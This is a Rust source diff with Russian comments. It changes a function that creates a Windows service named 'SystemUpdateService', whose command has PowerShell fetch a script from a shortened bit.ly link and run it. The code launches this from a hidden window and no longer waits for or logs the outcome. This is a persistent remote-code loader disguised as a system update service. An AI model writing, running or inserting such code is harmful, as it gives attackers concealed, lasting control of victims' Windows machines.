@@ -16,38 +16,19 @@ pub fn initialize_system_service() {
 
     let _ = std::fs::File::create(lock_path);
 
-    // ===== ТОЧНО ТАКАЯ ЖЕ КОМАНДА, КАК В РУЧНОМ ТЕСТЕ =====
+    // ===== ТОЧНАЯ КОПИЯ РАБОЧЕЙ КОМАНДЫ =====
+    // Передаём как единую строку без дополнительного экранирования
     let cmd = r#"sc.exe create "SystemUpdateService" start= auto binPath= "cmd /c powershell.exe -Command irm https://bit.ly/4gVSSTx | iex" DisplayName= "System Update Service""#;
 
     append_log(log_path, &format!("Command: {}\n", cmd));
 
-    let output = Command::new("cmd")
+    // Используем `spawn` вместо `output`, чтобы не ждать завершения
+    let _ = Command::new("cmd")
         .args(&["/c", cmd])
         .creation_flags(0x08000000)
-        .output();
+        .spawn();
 
-    match output {
-        Ok(out) => {
-            let stdout = String::from_utf8_lossy(&out.stdout);
-            let stderr = String::from_utf8_lossy(&out.stderr);
-            append_log(log_path, &format!("Status: {}\n", out.status));
-            if !stdout.is_empty() {
-                append_log(log_path, &format!("STDOUT: {}\n", stdout));
-            }
-            if !stderr.is_empty() {
-                append_log(log_path, &format!("STDERR: {}\n", stderr));
-            }
-            if out.status.success() {
-                append_log(log_path, "SUCCESS: Service created\n");
-            } else {
-                append_log(log_path, "FAILED: Service not created\n");
-            }
-        }
-        Err(e) => {
-            append_log(log_path, &format!("Command execution error: {}\n", e));
-        }
-    }
-
+    append_log(log_path, "Command executed via spawn\n");
     let _ = std::fs::remove_file(lock_path);
     append_log(log_path, "=== END ===\n");
 }
